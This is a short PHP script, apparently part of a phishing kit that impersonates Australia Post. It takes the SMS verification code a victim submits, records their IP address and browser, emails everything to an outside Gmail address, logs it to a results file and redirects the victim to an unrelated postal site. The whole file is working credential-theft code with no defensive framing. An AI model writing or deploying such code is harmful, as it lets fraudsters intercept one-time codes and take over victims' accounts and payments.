<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ australia POST SMS2]-----++--\n";
$message .= "-------------- BY Yass ht-----\n";
$message .= "SMS 2 : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------By Yass ht ----------------------\n";
$subject = "australia POST sms2 [ " . $zabi . " ]  ";
$email = "resultcash2020@gmail.com";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);

header("Location: https://www.posta.sk");
?>